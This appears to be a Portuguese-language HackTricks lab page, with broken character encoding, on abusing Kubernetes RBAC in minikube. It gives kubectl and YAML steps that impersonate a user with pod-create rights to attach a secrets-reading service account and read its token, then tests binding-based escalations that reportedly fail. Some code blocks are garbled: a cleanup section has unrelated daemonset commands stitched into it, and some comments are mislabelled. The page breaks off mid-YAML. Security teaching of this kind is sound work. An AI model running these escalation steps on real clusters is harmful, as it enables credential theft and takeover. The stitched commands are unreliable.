# Kubernetes Roles Abuse Lab

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Voc√™ pode executar esses laborat√≥rios apenas dentro do **minikube**.

## Cria√ß√£o de Pod -> Escalar para ns SAs

Vamos criar:

* Uma **conta de servi√ßo "test-sa"** com um privil√©gio de cluster para **ler segredos**
  * Um ClusterRole "test-cr" e um ClusterRoleBinding "test-crb" ser√£o criados
* **Permiss√µes** para listar e **criar** pods para um usu√°rio chamado "**Test**" ser√£o concedidas
  * Um Role "test-r" e RoleBinding "test-rb" ser√£o criados
* Em seguida, vamos **confirmar** que o SA pode listar segredos e que o usu√°rio Test pode listar um pod
* Finalmente, vamos **impersonar o usu√°rio Test** para **criar um pod** que inclui o **SA test-sa** e **roubar** o **token da conta de servi√ßo**.
  * Esta √© a maneira de mostrar que o usu√°rio pode escalar privil√©gios dessa maneira

{% hint style="info" %}
Para criar o cen√°rio, uma conta de administrador √© usada.\
Al√©m disso, para **exfiltrar o token da conta de servi√ßo** neste exemplo, a **conta de administrador √© usada** para executar dentro do pod criado. No entanto, **como explicado aqui**, a **declara√ß√£o do pod pode conter a exfiltra√ß√£o do token**, ent√£o o privil√©gio "exec" n√£o √© necess√°rio para exfiltrar o token, a **permiss√£o "create" √© suficiente**.
{% endhint %}

```bash
# Criar conta de servi√ßo test-sa
# Criar fun√ß√£o e vincula√ß√£o de fun√ß√£o para dar permiss√µes de listagem e cria√ß√£o sobre pods no namespace padr√£o para o usu√°rio Test
# Criar clusterrole e clusterrolebinding para dar acesso ao SA test-sa a segredos em todos os lugares

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: ServiceAccount
    name: test-sa
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    namespace: default
    name: test-sa
    apiGroup: ""
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Verificar se test-sa pode acessar segredos do kube-system
kubectl --as system:serviceaccount:default:test-sa -n kube-system get secrets

# Verificar se o usu√°rio Test pode obter pods no namespace padr√£o
kubectl --as Test -n default get pods

# Criar um pod como usu√°rio Test com o SA test-sa (etapa de privil√©gio)
echo "apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ['/bin/sh']
    args: ['-c', 'sleep 100000']
  serviceAccountName: test-sa
  automountServiceAccountToken: true
  hostNetwork: true"| kubectl --as Test apply -f -

# Conectar-se ao pod criado e confirmar que o token da conta de servi√ßo anexado pertence a test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpar o cen√°rio
kubectl delete pod test-pod
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test
# Conecte-se ao pod criado e confirme que o token SA anexado pertence a test-sa
kubectl exec -ti -n default daemonset.apps/alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpe o cen√°rio
kubectl delete daemonset alpine
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```

## N√£o funciona

### Criar/Modificar Bindings

**N√£o funciona:**

* **Criar um novo RoleBinding** apenas com o verbo **create**
* **Criar um novo RoleBinding** apenas com o verbo **patch** (voc√™ precisa ter permiss√µes de binding)
  * Voc√™ n√£o pode fazer isso para atribuir a fun√ß√£o a si mesmo ou a um SA diferente
* **Modificar um novo RoleBinding** apenas com o verbo **patch** (voc√™ precisa ter permiss√µes de binding)
  * Voc√™ n√£o pode fazer isso para atribuir a fun√ß√£o a si mesmo ou a um SA diferente

```bash
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["get", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb
subjects:
  - kind: User
    name: Test
roleRef:
  kind: Role
  name: test-r
  apiGroup: rbac.authorization.k8s.io
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-r2
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-rb2
subjects:
  - kind: ServiceAccount
    name: test-sa
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Crie um pod como usu√°rio Test com o SA test-sa (etapa de privesc)
echo "apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: test-r2
subjects:
  - kind: ServiceAccount
    name: test-sa2
    apiGroup: ""
roleRef:
  kind: Role
  name: test-r2
  apiGroup: rbac.authorization.k8s.io"| kubectl --as Test apply -f -

# Conecte-se ao pod criado e confirme que o token SA anexado pertence a test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Limpe o cen√°rio
kubectl delete rolebinding test-rb
kubectl delete rolebinding test-rb2
kubectl delete role test-r
kubectl delete role test-r2
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa2
```

### Bindings expl√≠citos

Na se√ß√£o "Preven√ß√£o de Escalonamento de Privil√©gios e Inicializa√ß√£o" de [https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/](https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/) √© mencionado que se um SA pode criar um Binding e tem permiss√µes de Bind expl√≠citas sobre a Fun√ß√£o/Cluster role, ele pode criar bindings mesmo usando Fun√ß√µes/ClusterRoles com permiss√µes que ele n√£o tem.\
No entanto, n√£o funcionou para mim:

```yaml
# Crie 2 SAs, d√™ a um deles permiss√µes para criar clusterrolebindings
# e permiss√µes de bind sobre a ClusterRole "admin"
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings"]
    verbs: ["get", "create"]
  - apiGroups: ["rbac.authorization.k8s.io/v1"]
    resources: ["clusterroles"]
    verbs: ["bind"]
    resourceNames: ["admin"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb
subjects:
  - kind: ServiceAccount
    name: test-sa
    namespace: default
roleRef:
  kind: ClusterRole
  name: test-cr
  apiGroup: rbac.authorization.k8s.io
' | kubectl apply -f -

# Tente vincular a ClusterRole "admin" com o segundo SA (n√£o funcionar√°)
echo 'apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-crb2
subjects:
  - kind: ServiceAccount
    name: test-sa2
    namespace: default
roleRef:
  kind: ClusterRole
  name: admin
  apiGroup: rbac.authorization.k8s.io
' | kubectl --as system:serviceaccount:default:test-sa apply -f -

# Limpe o ambiente
kubectl delete clusterrolebindings test-crb
kubectl delete clusterrolebindings test-crb2
kubectl delete clusterrole test-cr
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa
```

```yaml
# Como o exemplo anterior, mas neste caso tentamos usar RoleBindings
# em vez de CLusterRoleBindings

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: test-cr
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings"]
    verbs: ["get", "create"]
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["get", "create"]
  - apiGroups: ["rbac.authorization